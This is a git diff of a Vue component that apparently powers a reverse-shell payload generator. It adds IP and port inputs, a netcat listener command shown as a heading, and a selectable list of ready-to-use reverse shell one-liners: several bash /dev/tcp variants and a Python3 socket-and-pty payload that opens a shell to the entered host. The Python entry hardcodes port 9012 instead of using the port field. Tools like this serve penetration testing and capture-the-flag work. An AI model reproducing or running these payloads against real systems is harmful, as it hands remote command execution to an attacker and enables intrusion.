@@ -1,20 +1,28 @@
 <template>
-    <el-card class="box-card">
-        <div class="nkmode">
-            <h4 style="margin-top: 0;">IP & PORT</h4><el-button type="primary">更新</el-button>
-        </div>
-        <el-space :size="30">
-            <el-input v-model="reverse.ip" style="width: 210px;">
-                <template #prepend>IP:</template>
-            </el-input>
-            <el-input v-model="reverse.port" style="width: 200px;">
-                <template #prepend>PORT:</template>
-            </el-input>
-        </el-space>
-    </el-card>
+    <div style="display: flex;">
+        <el-card class="box-card">
+            <h4 style="margin-top: 0;">IP & PORT</h4>
+            <el-space :size="30">
+                <el-input v-model="reverse.ip" style="width: 210px;">
+                    <template #prepend>IP:</template>
+                </el-input>
+                <el-input v-model="reverse.port" style="width: 200px;">
+                    <template #prepend>PORT:</template>
+                </el-input>
+            </el-space>
+        </el-card>
+        <h1 style="text-align: center; width: 50%; margin-left: 10%;">nc -lvnp 8080</h1>
+    </div>
     <el-tabs type="border-card" style="margin-top: 10px;">
         <el-tab-pane label="Reverse">
-
+            <div style="display: flex;">
+                <el-table :data="data.rever" border highlight-current-row :show-header="false"
+                    @current-change="handleChange" style="width: 30%">
+                    <el-table-column prop="label" @current-change="handleChange" />
+                </el-table>
+                <el-input v-model="reverse.show" type="textarea" rows="20" resize="none"
+                    style="width: 80%; margin-left: 10px;"></el-input>
+            </div>
         </el-tab-pane>
         <el-tab-pane label="Bind">
             <div style="display: flex;">
@@ -40,7 +48,7 @@
 </template>
   
 <script lang="ts" setup>
-import { reactive } from 'vue';
+import { reactive, watch } from 'vue';
 
 const reverse = reactive({
     ip: '10.10.10.1',
@@ -48,10 +56,32 @@ const reverse = reactive({
     show: '',
 })
 
+watch(() => [reverse.ip, reverse.port], ([newIp, newPort], [oldIp, oldPort]) => {
+    reverse.show = reverse.show.replaceAll(oldIp, newIp)
+    reverse.show = reverse.show.replaceAll(oldPort, newPort)
+})
+
 var data = reactive({
     rever: [
         {
-
+            label: "Bash -i",
+            value: `sh -i >& /dev/tcp/${reverse.ip}/${reverse.port} 0>&1`,
+        },
+        {
+            label: "Bash 196",
+            value: `0<&196;exec 196<>/dev/tcp/${reverse.ip}/${reverse.port}; sh <&196 >&196 2>&196`,
+        },
+        {
+            label: "Bash read line",
+            value: `exec 5<>/dev/tcp/${reverse.ip}/${reverse.port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
+        },
+        {
+            label: "Bash 5",
+            value: `sh -i 5<> /dev/tcp/${reverse.ip}/${reverse.port} 0<&5 1>&5 2>&5`,
+        },
+        {
+            label: "Python3",
+            value: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${reverse.ip}",9012));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
         },
     ],
     bind: [
@@ -147,5 +177,7 @@ function handleChange(row: any) {
     reverse.show = row.value;
 }
 
+function updateText() {
 
+}
 </script>
